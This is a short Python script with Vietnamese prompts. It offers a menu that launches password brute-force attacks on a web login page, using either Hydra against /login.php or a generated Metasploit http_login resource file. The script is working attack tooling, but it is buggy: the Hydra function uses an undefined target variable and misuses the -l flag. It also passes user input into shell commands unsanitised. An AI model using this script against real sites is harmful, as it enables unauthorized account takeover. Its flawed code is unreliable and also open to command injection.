import subprocess

def run_hydra():
    username_list = input("Nhập đường dẫn tới danh sách tên người dùng: ")
    password_list = input("Nhập đường dẫn tới danh sách mật khẩu: ")
    command = f"hydra -l {username_list} -P {password_list} {target} http-get-form '/login.php:user=^USER^&pass=^PASS^:Invalid Password' -V"
    subprocess.run(command, shell=True)

def run_metasploit():
    target = input("Nhập URL mục tiêu: ")
    password_list = input("Nhập đường dẫn tới danh sách mật khẩu: ")
    msf_script = f"use auxiliary/scanner/http/http_login\n"
    msf_script += f"set RHOSTS {target}\n"
    msf_script += f"set STOP_ON_SUCCESS true\n"  # Dừng khi tìm thấy mật khẩu thành công
    msf_script += f"set VERBOSE true\n"  # Hiển thị thông tin chi tiết
    msf_script += f"set USERPASS_FILE {password_list}\n"  # Danh sách tên người dùng và mật khẩu
    msf_script += f"set BLANK_PASSWORDS true\n"  # Kiểm tra mật khẩu trống
    msf_script += f"set THREADS 5\n"  # Số luồng thực hiện đồng thời
    msf_script += f"run\n"
    with open("metasploit_script.rc", "w") as f:
        f.write(msf_script)
    command = "msfconsole -r metasploit_script.rc"
    subprocess.run(command, shell=True)

if __name__ == "__main__":
   
    print("Chọn công cụ bạn muốn sử dụng:")
    print("1. Hydra")
    print("2. Metasploit")
    
    choice = input("Nhập lựa chọn của bạn: ")

    if choice == "1":
        run_hydra()
    elif choice == "2":
        run_metasploit()
    else:
        print("Lựa chọn không hợp lệ")
